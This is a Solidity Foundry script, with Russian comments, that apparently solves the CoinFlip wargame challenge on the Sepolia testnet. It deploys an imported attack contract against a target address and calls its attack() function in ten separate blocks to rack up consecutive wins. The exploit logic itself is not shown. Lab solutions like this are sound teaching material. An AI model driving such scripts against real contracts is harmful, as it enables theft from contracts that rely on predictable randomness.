// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
import {CoinFlipAttack} from "../src/CoinFlipAttack.sol";

// 1) один раз: forge script script/CoinFlip.s.sol:Deploy --rpc-url $SEPOLIA_RPC_URL --broadcast --private-key $PRIVATE_KEY
contract Deploy is Script {
    function run() external {
        address target = vm.envAddress("COINFLIP_ADDRESS");

        vm.startBroadcast();
        CoinFlipAttack attacker = new CoinFlipAttack(target);
        vm.stopBroadcast();

        console2.log("Attacker deployed at:", address(attacker));
        console2.log("=> put this into ATTACKER_ADDRESS in .env");
    }
}

// 2) 10 раз, каждый в новом блоке: forge script script/CoinFlip.s.sol:Attack --rpc-url $SEPOLIA_RPC_URL --broadcast --private-key $PRIVATE_KEY
contract Attack is Script {
    function run() external {
        address attackerAddr = vm.envAddress("ATTACKER_ADDRESS");

        CoinFlipAttack attacker = CoinFlipAttack(attackerAddr);

        vm.startBroadcast();
        attacker.attack();
        vm.stopBroadcast();

        console2.log("consecutiveWins:", attacker.wins());
    }
}
